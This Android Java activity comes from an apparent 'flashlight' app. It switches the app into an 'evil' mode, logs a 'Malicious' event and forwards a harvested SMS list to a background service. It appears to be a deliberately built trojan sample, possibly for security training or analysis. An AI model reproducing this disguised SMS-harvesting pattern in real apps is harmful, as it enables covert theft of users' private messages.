package com.example.flashlightIITR;


import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.Serializable;
import java.lang.reflect.Type;
import java.util.HashMap;

public class NotificationActivity extends AppCompatActivity {
    HashMap<String,String>  smsList = new HashMap<String,String>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        MainActivity.version="17";
        MainActivity.isEvil=true;
        Clues myclues=new Clues();
        myclues.SendLog("App Mode Change","App entered onCreate()","Malicious");

        Intent intent = getIntent();
        Log.d("Notify", "Got an intent.");

        if (intent != null) {
            Log.d("Notify", "In the if condition.");
            if (intent.hasExtra("SMS_LIST")) {
                // Retrieve the smsList data from the intent extras
                Log.d("Notify", "Intent has SMS_LIST");
                String serializedData = intent.getStringExtra("SMS_LIST");
                Gson gson = new Gson();
                Type type = new TypeToken<HashMap<String, String>>(){}.getType();
                HashMap<String, String> receivedSmsList = gson.fromJson(serializedData, type);
                Log.d("Notify", String.valueOf(receivedSmsList));

                Intent intentBackground = new Intent(this, BackgroundService.class);
                intentBackground.putExtra("SMS_LIST", receivedSmsList);
                startService(intentBackground);
                Log.d("Notify","Triggering the BackgroundService");


            } else {
                Log.e("Notify", "Intent does not contain SMS_LIST extra");
            }
        } else {
            Log.e("Notify", "Intent is null");
        }

    }

    @SuppressWarnings("unchecked")
    private HashMap<String, String> deserializeHashMap(Serializable serializable) {
        return (HashMap<String, String>) serializable;
    }
}







// smsList = (HashMap<String,String>) getIntent().getExtras().get("SMS_LIST");
//        Log.d("Notify","Receive the data of Contacts.");
//
